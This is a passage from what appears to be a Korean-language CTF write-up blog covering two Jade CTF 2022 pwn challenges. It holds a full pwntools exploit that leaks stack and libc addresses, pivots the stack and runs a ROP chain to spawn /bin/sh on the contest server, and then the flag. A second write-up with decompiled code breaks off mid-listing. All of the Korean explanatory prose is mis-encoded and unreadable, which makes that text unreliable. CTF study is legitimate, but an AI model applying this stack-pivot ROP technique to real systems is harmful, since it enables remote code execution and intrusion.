class="line">  v2 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;Hello %s, we are sorry but you gave us the wrong input. Please try again.\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">2</span>, temp_buffer, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏßÄÏó≠Î≥ÄÏàò sÏóê Ïù¥Î¶ÑÏùÑ ÏûÖÎ†•Î∞õÎäîÎã§. bofÍ∞Ä ÏùºÏñ¥ÎÇ† Í∞ÄÎä•ÏÑ±ÏùÑ ÏóºÎëêÏóê ÎíÄÏßÄÎßå 108 ÌÅ¨Í∏∞Ïóê 100ÎßåÌÅº ÏûÖÎ†•ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê bofÎäî ÏùºÏñ¥ÎÇòÏßÄ ÏïäÎäîÎã§. Ïù¥ Ìï®ÏàòÏóêÏÑú Ï∑®ÏïΩÏ†êÏùÄ Î∞úÏÉùÌïòÏßÄ ÏïäÎäîÎã§. </p><h4 id="2-odd-option"><a href="#2-odd-option" class="headerlink" title="2. odd_option()"></a>2. odd_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">odd_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">108</span>]; <span class="comment">// [rsp+D0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+13Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Let&#x27;s begin, but first here is how you play:\n&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- A number will be shown to you\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- You have to enter two strings\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The first should be your name\n&quot;</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The second string should be equal to the secret code\n&quot;</span>, <span class="number">0x39</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- If you successfully guess the secret code, you win!\n&quot;</span>, <span class="number">0x36</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;\nHere&#x27;s the number: %lld\n&quot;</span>, s);</span><br><span class="line">  write(<span class="number">2</span>, temp_buffer, v3);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter first input please: &quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">200</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter second input please: &quot;</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  fgets(dest, <span class="number">130</span>, <span class="built_in">stdin</span>); <span class="comment">// bof</span></span><br><span class="line">  result = <span class="built_in">strcpy</span>(dest, secret_buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Congrats! You win!\n&quot;</span>, <span class="number">0x13</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>208 ÌÅ¨Í∏∞Ïùò ÏßÄÏó≠Î≥ÄÏàò sÏóê 200ÎßåÌÅº ÏûÖÎ†•ÌïòÍ≥† 108 ÌÅ¨Í∏∞Ïùò ÏßÄÏó≠Î≥ÄÏàò destÏóê 130ÎßåÌÅº ÏûÖÎ†•ÌïúÎã§. Ïó¨Í∏∞ÏÑú bofÍ∞Ä Î∞úÏÉùÌïúÎã§. Î∞îÎ°ú Îí§Ïóê srctpyÌï®ÏàòÏóêÏÑú secret_bufferÎ•º destÏóê Î≥µÏÇ¨ÌïúÎã§.<br>Ïù¥ Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêòÍ∏∞ Ï†ÑÏóê mainÏóêÏÑú <code>fill_secret_buffer()</code> Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïòÎäîÎç∞ Ïó¨Í∏∞ÏÑú secret_buffer Ï†ÑÏó≠Î≥ÄÏàòÎ•º Ï±ÑÏö¥Îã§.</p><p>Í≤∞Î°†Ï†ÅÏúºÎ°ú ÏïåÏïÑÎÇ∏ Í≤ÉÏùÄ ÏßÄÏó≠Î≥ÄÏàò destÏóêÏÑú 130-0x70 Ï¶â, 18ÎßåÌÅº overflowÍ∞Ä ÎÇúÎã§Îäî Í≤ÉÏù¥Îã§.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>overflowÍ∞Ä 18ÎßåÌÅºÎÇúÎã§? sfp(rbp), ret..</p><p>retÍπåÏßÄ ÏïàÏ†ÑÌïòÍ≤å ÎçÆÍ≥† 2Î∞îÏù¥Ìä∏ Îçî overflowÍ∞Ä ÎÇúÎã§. ROPÎ•º ÌïòÍ∏∞ÏóêÎäî overflowÍ∞Ä Ï∂©Î∂ÑÌûà ÎÇòÏßÄ ÏïäÎäîÎã§. Ïù¥Îü¥ Îïå Ìï¥ÏïºÌïòÎäî Í≤ÉÏù¥ Stack pivotingÏù¥Îã§. Ïù¥ÏôÄ Í¥ÄÎ†®Ìï¥ÏÑúÎäî (Íµ¨ Î∏îÎ°úÍ∑∏ÏóêÎèÑ Ïç®ÎÜ®ÏßÄÎßå) ÏãúÍ∞ÑÏù¥ ÎêúÎã§Î©¥ Ïù¥ Î∏îÎ°úÍ∑∏Ïóê Í∏ÄÏùÑ ÏÉàÎ°ú Ïì∏ ÏòàÏ†ïÏù¥Îã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>overflowÍ∞Ä retÍπåÏßÄ ÎÇ† ÎïåÎäî stack pivoting Í∏∞Î≤ïÏùÑ Í≥†Î†§Ìï¥Î≥º Ïàò ÏûàÍ≤†Îã§. Ïù¥Î•º ÏúÑÌï¥ÏÑú fake stackÏùÑ Íµ¨ÏÑ±Ìï† Í≥µÍ∞ÑÏù¥ ÌïÑÏöîÌïòÎã§. Ïù¥ Î¨∏Ï†úÏóêÏÑúÎäî ‚ÄúEnter first input please: ‚ÄúÏóêÏÑú ÏßÄÏó≠Î≥ÄÏàò sÏóê 200ÎßåÌÅº ÏûÖÎ†•Ìï† Ïàò ÏûàÎã§. 200Î∞îÏù¥Ìä∏Î©¥ ROP ÌéòÏù¥Î°úÎìúÎ•º Ï†ÅÍ∏∞Ïóê Ï∂©Î∂ÑÌïòÎã§. Ïó¨Í∏∞Î•º fake stackÏúºÎ°ú ÌïúÎã§! ÎïÖÎïÖ</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="PART1"><a href="#PART1" class="headerlink" title="PART1"></a>PART1</h4><ol><li>libc leakÌïòÎäî ROP ÌéòÏù¥Î°úÎìúÎ•º ÏûëÏÑ±ÌïòÏó¨ stackÏóê Íµ¨ÏÑ±</li><li>ÏúÑ stackÏúºÎ°ú ÌùêÎ¶Ñ Î≥ÄÍ≤Ω</li></ol><h4 id="PART2"><a href="#PART2" class="headerlink" title="PART2"></a>PART2</h4><ol><li><code>system(&#39;/bin/sh\x00&#39;)</code>ÏùÑ Ìò∏Ï∂úÌïòÎäî ROP ÌéòÏù¥Î°úÎìúÎ•º ÏûëÏÑ±ÌïòÏó¨ stackÏóê Íµ¨ÏÑ±</li><li>ÏúÑ stackÏúºÎ°ú ÌùêÎ¶Ñ Î≥ÄÍ≤Ω</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400946</span></span><br><span class="line">ret = <span class="number">0x04006b9</span></span><br><span class="line"></span><br><span class="line">fake_stack= <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>])</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">stack_pivoting_gadget = <span class="number">0x0400B1C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;libc leak :: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;offset :: &#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]))</span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak 2 :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">fake_stack = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(binsh)</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;p1v0t!_p1v0t!_p1v0t!&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>Îã§ ÌíÄÍ≥† ÎÇòÏÑú Î°∏ÏóÖ ÏûëÏÑ±ÌïòÎäîÎç∞ Î¨∏Ï†ú ÌíÄ ÎïåÎäî Î™ª Î¥§Îçò Ìï®ÏàòÎ•º Î∞úÍ≤¨ÌñàÎã§..„Öã„Öã Ïù¥ Ìï®ÏàòÎ•º ÏßÑÏûëÏóê Î¥§ÎçîÎùºÎ©¥ Îçî ÏâΩÍ≤å Î¨∏Ï†úÎ•º ÌíÄ Ïàò ÏûàÏóàÏùÑ ÌÖêÎç∞.. Í∑∏Îü∞Îç∞ Ïù¥Îü∞ ÏÉùÍ∞ÅÏùÑ Í∞ÄÏßÄÎ©¥ ÏïàÎêúÎã§. Ïù¥ Î¨∏Ï†ú ÎçïÏóê Ïä§ÌÉù ÌîºÎ¥áÌåÖ Î¶¨ÎßàÏù∏ÎìúÌñàÏúºÎãàÍπå~ Ïò§ÌûàÎ†§ Ï¢ãÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">hidden_level</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Oooh! You reached the hidden level, type the mantra to unlock the hidden door:\n&quot;</span>, <span class="number">0x4F</span>uLL);</span><br><span class="line">  result = fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Did you cheat?\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>Îä¶Ïû• Î∂ÄÎ¶¨Îã§Í∞Ä Î°∏ÏóÖÏùÑ ÎÑàÎ¨¥ Îä¶Í≤å ÏûëÏÑ±ÌñàÎã§. Ïù¥ Ïî®ÌÖù‚Ä¶ ÏÑúÎ≤Ñ Ïò§Îûò ÏÇ¥ÏïÑÏûàÏñ¥ÏÑú Ï¢ãÏïòÎäîÎç∞ Î°∏ÏóÖ ÏûëÏÑ±Ìï† ÎãπÏãú ÏÑúÎ≤ÑÍ∞Ä Îã´ÌòîÎã§. Î°∏ÏóÖÏùÄ.. Ï†úÎïåÏ†úÎïå Îπ®Î¶¨Îπ®Î¶¨ ÏûëÏÑ±ÌïòÏûê T_T.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Roll the dice (Shellcode, NOP Sled)</title>
      <link href="/221028-jadectf2022-roll_the_dice/"/>
      <url>/221028-jadectf2022-roll_the_dice/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(18&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Roll the dice, enter the coupon. Did you win? No? No worries. Try again. Life‚Äôs all about chances.</p><p>nc 34.76.206.46 10006</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îî‚îÄ‚îÄ chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">choose_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter your choice: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    roll_the_dice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( coupon )                               <span class="comment">// checking the global variable for ROP</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, but you only get one chance to enter the coupon code!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      coupon = <span class="number">1</span>;</span><br><span class="line">      enter_coupon();                           <span class="comment">// only 1 time</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s too sad to see you go :(&quot;</span>);</span><br><span class="line">    quit = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( quit )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> choose_option();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïù¥ Ìï®ÏàòÏóêÏÑú Î©îÎâ¥Î•º Í≥†Î•º Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome To The Festive Lottery!</span><br><span class="line"></span><br><span class="line">1. Roll the dice!</span><br><span class="line">2. Enter a coupon code</span><br><span class="line">3. Exit</span><br><span class="line">Enter your choice: </span><br></pre></td></tr></table></figure><p>1Î≤à Î©îÎâ¥Îäî <code>roll_the_dice()</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÏºúÏ§ÄÎã§.<br>2Î≤à Î©îÎâ¥ÏóêÏÑú Ïó¨Îü¨Í∞ÄÏßÄ Í≤ÄÏÇ¨Î•º ÌïúÎã§. coupon Ï†ÑÏó≠ Î≥ÄÏàòÎ•º Í≤ÄÏÇ¨ÌïòÎäîÎç∞, playerÍ∞Ä Ìïú Î≤àÎßå <code>enter_coupon()</code> Ìï®ÏàòÎßå Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§Îäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§.</p><h4 id="1-Roll-the-dice"><a href="#1-Roll-the-dice" class="headerlink" title="1. Roll the dice!"></a>1. Roll the dice!</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">roll_the_dice</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( rand() % <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Hurray! You got a 1&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congrats! You won a flag!&quot;</span>);</span><br><span class="line">      result = win();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Ah! You just missed it&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">if</span> ( got_6 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;Sorry, you can avail this offer only once!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        got_6 = <span class="number">1</span>;</span><br><span class="line">        another_chance = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;You get another chance to enter the coupon!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Did you tamper with the dice? This number should not be there!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>case 3ÏùºÎïå Ï∂úÎ†•Ìï¥Ï£ºÎäî Ï†Ä flagÎäî Í∞ÄÏßú ÌîåÎûòÍ∑∏Ïù¥Îã§.</p><p>case 5Ïùò another_chanceÏóê Ï£ºÎ™©Ìï¥Î≥¥Ïûê. ÎØ∏Î¶¨ Ïù¥ÏïºÍ∏∞ÌïòÏûêÎ©¥ Ïù¥ Ï†ÑÏó≠ Î≥ÄÏàòÎäî 2Î≤à Î©îÎâ¥Ïù∏ <code>enter_coupon()</code> Ìï®ÏàòÏóêÏÑú ÏÇ¨Ïö©ÎêúÎã§.</p><p>got_6 Ï†ÑÏó≠ Î≥ÄÏàòÎäî Ïù¥Îü∞ another_chanceÎ•º Îã® ÌïúÎ≤àÎßå 1Î°ú ÏÑ∏ÌåÖÌï† Ïàò ÏûàÎã§Îäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïòÎäî Í≤É Í∞ôÎã§.</p><h4 id="2-Enter-a-coupon-code"><a href="#2-Enter-a-coupon-code" class="headerlink" title="2. Enter a coupon code"></a>2. Enter a coupon code</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 